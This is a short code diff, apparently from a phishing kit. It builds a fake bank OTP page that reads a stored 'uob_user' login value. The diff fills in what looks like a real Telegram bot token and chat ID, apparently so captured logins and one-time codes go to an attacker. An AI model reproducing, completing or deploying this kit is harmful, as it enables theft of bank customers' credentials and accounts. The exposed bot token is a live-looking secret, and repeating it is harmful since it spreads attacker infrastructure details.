@@ -152,7 +152,7 @@
   </div>
   <h2>Enter OTP</h2>
   <form id="otpForm" action="javascript:void(0);" aria-label="OTP form">
-    <input type="text" id="otp" name="otp" placeholder="Enter OTP" aria-label="OTP" maxlength="6" required autofocus pattern="[0-9]{6}" title="6 digit OTP"/>
+    <input type="pasword" id="otp" name="otp" placeholder="Enter OTP" aria-label="OTP" maxlength="6" required autofocus pattern="[0-9]{6}" title="6 digit OTP"/>
     <button type="submit" id="otpBtn">Submit</button>
   </form>
 </div>
@@ -165,8 +165,8 @@
 
 <script>
   // Ganti dengan token dan chat ID Telegram Anda
-  const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-  const telegramChatId = 'YOUR_TELEGRAM_CHAT_ID';
+  const telegramBotToken = '8729819513:AAHuJSCT5sT4zR6Yv6xx-JdttOCKtR31hOM';
+  const telegramChatId = '6647221855';
 
   // Ambil data login dari sessionStorage
   const user = sessionStorage.getItem('uob_user');
